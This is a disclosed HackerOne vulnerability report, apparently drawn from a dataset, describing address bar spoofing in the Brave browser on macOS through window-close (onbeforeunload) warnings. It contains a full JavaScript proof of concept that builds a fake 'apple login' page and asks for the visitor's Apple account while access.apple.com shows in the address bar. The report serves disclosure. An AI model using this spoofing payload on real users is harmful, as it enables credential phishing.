---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '208834'
original_report_id: '208834'
title: Address bar spoofing in Brave browser via. window close warnings
weakness: Violation of Secure Design Principles
team_handle: brave
created_at: '2017-02-25T08:54:01.874Z'
disclosed_at: '2017-08-10T05:09:22.500Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 5
tags:
- hackerone
- violation-of-secure-design-principles
---

# Address bar spoofing in Brave browser via. window close warnings

## Metadata

- HackerOne Report ID: 208834
- Weakness: Violation of Secure Design Principles
- Program: brave
- Disclosed At: 2017-08-10T05:09:22.500Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hello,
I would like to Report Address Bar spoofing vulnerability in Brave Browser on macOS.

## Summary:

When people visit the poc page,I notice them to type a DNS record exist but cannot access domain "access.apple.com" to address bar.then window will popup a close warnings,then phishing is beginning...


## Products affected: 

**macOS Sierra version:** 10.12.3

**Brave version:**

Brave: 0.13.4 
rev: 71d8ffc7278a90b22b8617d37880787c1781e694 
Muon: 2.56.4 
libchromiumcontent: 56.0.2924.87 
V8: 5.6.326.50 
Node.js: 7.4.0 
Update Channel: dev 
os.platform: darwin 
os.release: 16.4.0 
os.arch: x64


## Steps To Reproduce:

 1.POC script is:

```
<h1 id="msg">Next,type access.apple.com in the address bar.</h1>
<h1 id="spoof"></h1>
<script type="text/javascript">
spoof.style.display = 'none';
var done = 0;
var got = 0;
onbeforeunload = function(ev) {
  done = 1;
  return false;
}
onmousemove = function() {
  stop();
  if (done && !got) {
    msg.style.display = 'none';
    got = "1000";
    if (got) {
      document.write("<title>apple login</title><h1>This is not apple.com!!!</h1><scri"+"pt>onbeforeunload=function(){/*while(1){}*/};document.write('<input id=\\\'log\\\'>');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com');</scrip"+"t>");
      spoof.style.display = 'block';
      log.value = got;
      
    }
  }
}
</script>
```

2. Or you can visit online poc page,then following page instruction:

[https://api.lightrains.org/poc/17.html](https://api.lightrains.org/poc/17.html)

Best regards!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
